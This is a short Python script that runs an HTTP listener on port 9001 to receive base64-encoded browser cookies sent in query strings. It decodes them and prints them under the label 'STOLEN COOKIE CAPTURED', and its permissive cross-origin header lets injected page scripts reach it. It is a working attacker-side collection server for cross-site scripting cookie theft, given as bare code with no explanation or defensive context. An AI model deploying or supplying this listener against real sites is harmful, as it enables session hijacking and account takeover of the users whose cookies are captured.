from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
from urllib.parse import urlparse, parse_qs

class CookieLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        # Parse the query parameters
        query = parse_qs(urlparse(self.path).query)
        if 'cookie' in query:
            encoded_cookie = query['cookie'][0]
            try:
                decoded_cookie = base64.b64decode(encoded_cookie).decode('utf-8')
                print(f"\n[!] ALERT: STOLEN COOKIE CAPTURED")
                print(f"    Raw: {encoded_cookie}")
                print(f"    Decoded: {decoded_cookie}\n")
            except:
                print(f"[?] Captured raw data: {encoded_cookie}")
        
        self.wfile.write(b"Logged.")

print("Starting listener on port 9001...")
HTTPServer(('0.0.0.0', 9001), CookieLogger).serve_forever()